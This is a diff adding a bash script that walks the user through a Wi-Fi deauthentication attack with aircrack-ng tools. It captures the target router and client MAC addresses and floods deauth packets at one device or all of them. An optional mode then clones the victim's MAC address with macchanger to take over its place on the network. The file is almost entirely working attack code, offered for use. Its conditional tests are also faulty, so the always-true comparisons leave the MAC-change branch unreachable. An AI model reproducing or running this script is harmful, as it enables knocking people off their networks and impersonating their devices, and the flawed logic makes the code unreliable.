@@ -1,0 +1,58 @@
+#!/bin/bash
+echo "Do you want to Deauth and change or Deauth Only [d or dc]"
+read choice
+echo "what is your network card [ex :- wlan0]"
+read networkcard
+if [ "$choice" = "d" ] || [ "D" ];
+then
+	airmon-ng start $networkcard
+	airodump-ng "$networkcard"mon
+	echo "what is your router mac address?"
+	read routermac
+	echo "what is the channel"
+	read channel
+	airodump-ng --bssid $routermac --channel $channel "$networkcard"mon
+	echo "Do you want to Deauth all or only one person [a or o]"
+	read deauthchoice
+	if [ "$deauthchoice" = "a" ]|| [ "A" ];
+	then
+		echo "how much packets do you want to send "
+		read packets
+		aireplay-ng --deauth $packets -a $routermac "$networkcard"mon
+		airmon-ng stop "$networkcard"mon
+		service NetworkManager restart
+	elif [ "$deauthchoice" = "o" ] || [ "O" ];
+	then
+		echo "what is the device mac address"
+		read devicemac
+		echo "how much packets do you want to send "
+		read packets
+		aireplay-ng --deauth $packets -c $devicemac -a $routermac "$networkcard"mon
+		airmon-ng stop "$networkcard"mon
+		service NetworkManager restart
+	fi
+elif [ "$choice" = "dc" ]|| [ "DC" ] || [ "Dc" ] || [ "dC" ] 
+then
+	airmon-ng start $networkcard
+	airodump-ng "$networkcard"mon
+	echo "what is your router mac address?"
+	read routermac
+	echo "what is the channel"
+	read channel
+	airodump-ng --bssid $routermac --channel $channel "$networkcard"mon
+	echo "what is the device mac address"
+	read devicemac
+	echo "how much packets do you want to send "
+	read packets
+	aireplay-ng --deauth $packets -c $devicemac -a $routermac "$networkcard"mon
+	airmon-ng stop "$networkcard"mon
+	ifconfig $networkcard down
+	sleep 2
+	macchanger -m $devicemac $networkcard
+	ifconfig $networkcard up
+	service NetworkManager restart
+fi
+echo "the script will move to the main menu in 3 sec"
+sleep 3 
+cd ..
+./MainScript.sh
